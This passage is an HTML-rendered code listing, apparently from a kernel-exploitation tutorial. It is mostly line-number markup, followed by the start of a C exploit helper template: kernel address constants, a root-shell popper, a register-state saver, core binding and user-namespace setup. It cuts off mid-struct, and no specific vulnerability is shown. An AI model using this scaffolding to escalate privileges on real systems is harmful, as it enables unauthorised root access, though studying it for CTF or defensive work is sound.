class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br><span class="line">1248</span><br><span class="line">1249</span><br><span class="line">1250</span><br><span class="line">1251</span><br><span class="line">1252</span><br><span class="line">1253</span><br><span class="line">1254</span><br><span class="line">1255</span><br><span class="line">1256</span><br><span class="line">1257</span><br><span class="line">1258</span><br><span class="line">1259</span><br><span class="line">1260</span><br><span class="line">1261</span><br><span class="line">1262</span><br><span class="line">1263</span><br><span class="line">1264</span><br><span class="line">1265</span><br><span class="line">1266</span><br><span class="line">1267</span><br><span class="line">1268</span><br><span class="line">1269</span><br><span class="line">1270</span><br><span class="line">1271</span><br><span class="line">1272</span><br><span class="line">1273</span><br><span class="line">1274</span><br><span class="line">1275</span><br><span class="line">1276</span><br><span class="line">1277</span><br><span class="line">1278</span><br><span class="line">1279</span><br><span class="line">1280</span><br><span class="line">1281</span><br><span class="line">1282</span><br><span class="line">1283</span><br><span class="line">1284</span><br><span class="line">1285</span><br><span class="line">1286</span><br><span class="line">1287</span><br><span class="line">1288</span><br><span class="line">1289</span><br><span class="line">1290</span><br><span class="line">1291</span><br><span class="line">1292</span><br><span class="line">1293</span><br><span class="line">1294</span><br><span class="line">1295</span><br><span class="line">1296</span><br><span class="line">1297</span><br><span class="line">1298</span><br><span class="line">1299</span><br><span class="line">1300</span><br><span class="line">1301</span><br><span class="line">1302</span><br><span class="line">1303</span><br><span class="line">1304</span><br><span class="line">1305</span><br><span class="line">1306</span><br><span class="line">1307</span><br><span class="line">1308</span><br><span class="line">1309</span><br><span class="line">1310</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * I - fundamental functions</span></span><br><span class="line"><span class="comment"> * e.g. CPU-core binder, user-status saver, etc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>, kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> page_offset_base = <span class="number">0xffff888000000000</span>, vmemmap_base = <span class="number">0xffffea0000000000</span>;</span><br><span class="line"><span class="type">size_t</span> init_task, init_nsproxy, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">direct_map_addr_to_page_addr</span><span class="params">(<span class="type">size_t</span> direct_map_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* root checker and shell poper */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* to exit the process normally, instead of segmentation fault */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* userspace status saver */</span></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief create an isolate namespace</span></span><br><span class="line"><span class="comment"> * note that the caller **SHOULD NOT** be used to get the root, but an operator</span></span><br><span class="line"><span class="comment"> * to perform basic exploiting operations in it only</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unshare_setup</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span 